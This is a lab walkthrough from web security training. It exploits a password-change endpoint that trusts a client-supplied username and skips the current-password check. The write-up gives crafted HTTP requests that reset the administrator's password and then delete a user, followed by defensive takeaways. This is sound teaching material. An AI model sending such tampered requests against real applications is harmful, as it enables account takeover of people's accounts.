# Weak isolation on dual-use endpoint



**Difficulty:** Practitioner  

**Status:** Solved  

**Category:** Business Logic Vulnerabilities / Access Control



## Vulnerability



**Weak isolation on a dual-use endpoint** occurs when an endpoint performs a sensitive operation for a user but fails to properly isolate 
that operation to the currently authenticated account.



In this lab, the password-change endpoint uses a user-controlled `username` parameter to determine whose password should be changed. The 
application also fails to properly enforce the `current-password` check.



This allows a normal user to change the password of another account, including the `administrator`.



---



## Goal



Access the `administrator` account and delete the user `carlos`.



---



## Credentials



```text

Username: wiener

Password: peter

```



---



# 1. Log in



Log in to the lab using:



```text

wiener:peter

```



Then open the **My Account** page.



---



# 2. Capture the password-change request



Change the password normally while Burp Suite is running.



The request can be found in:



```text

Proxy → HTTP history

```


A typical request looks like:



```http

POST /my-account/change-password HTTP/2

Host: <LAB-HOST>

Content-Type: application/x-www-form-urlencoded



username=wiener&current-password=peter&new-password=123456

```



The exact headers and session cookie will vary.



---



# 3. Send the request to Repeater



Send the request to **Burp Repeater**.



The first thing to test is whether `current-password` is actually required.



---



# 4. Remove `current-password`



Remove the `current-password` parameter:



```http

POST /my-account/change-password HTTP/2

Host: <LAB-HOST>

Content-Type: application/x-www-form-urlencoded



username=wiener&new-password=123456

```



Send the request.



The password is successfully changed even though the current password was not provided.



### Why?



A secure password-change function should require proof that the authenticated user knows the current password.




The application fails to enforce this validation.



This gives us a useful attack primitive.



---



# 5. Change the target username



The request contains:



```text

username=wiener

```



This parameter determines which account's password is changed.



Change it to:



```text

username=administrator

```




while keeping `current-password` omitted.



The final request is:



```http

POST /my-account/change-password HTTP/2


Host: <LAB-HOST>

Content-Type: application/x-www-form-urlencoded



username=administrator&new-password=123456

```


Send the request.



The administrator's password is now changed.



---



## Why does this work?



Two logic flaws are combined:



### 1. Missing password validation





The application allows a password change without requiring:



```text

current-password


```



### 2. User-controlled account selection



The application trusts:


```text



username

```



to determine which account should be modified.



There is no proper authorization check ensuring that the authenticated user is allowed to change the password of the specified account.



Therefore, a user authenticated as:



```text

wiener

```





can target:



```text


administrator

```



---



# 6. Log in as administrator



Log out from the `wiener` account.



Then log in using:



```text

Username: administrator

Password: <the password you just set>

```



The login should succeed.




---




# 7. Delete carlos


Open the administrator panel:



```text

/admin

```



Locate the user:



```text


carlos



```


and delete the account.


The lab should now be marked as:



```text

LAB SOLVED


```




---




# Exploitation Requests



### Original request




```http

POST /my-account/change-password HTTP/2



username=wiener&current-password=peter&new-password=123456

```



### Step 1 — Remove current password



```http

POST /my-account/change-password HTTP/2




username=wiener&new-password=123456

```



**Why:**  

To test whether the application actually enforces the current-password check.



---




### Step 2 — Target administrator




```http


POST /my-account/change-password HTTP/2



username=administrator&new-password=123456

```



**Why:**  

The `username` parameter controls which account's password is modified, and the application does not properly verify authorization for the 
target account.





---



# Attack Flow




```text

Login as wiener

        ↓

Open My Account

        ↓
Capture change-password request

        ↓

Send request to Burp Repeater


        ↓

Remove current-password

        ↓

Password change still succeeds

        ↓

Change username=wiener

to username=administrator

        ↓

Set administrator's password

        ↓

Log in as administrator

        ↓

Open Admin Panel

        ↓

Delete carlos




        ↓

LAB SOLVED


```




---



# Key Takeaways



- Never rely on a client-controlled `username` to determine authorization.

- Sensitive account-management operations must be tied to the authenticated user's identity.

- Removing a security-related parameter is a useful test for missing server-side validation.

- Authentication and authorization are separate security controls.

- A valid session does not automatically authorize access to another user's account.

- Sensitive operations should enforce authorization server-side rather than trusting client-supplied identifiers.




**Main lesson:**



> Client-controlled identifiers must never be treated as proof of authorization.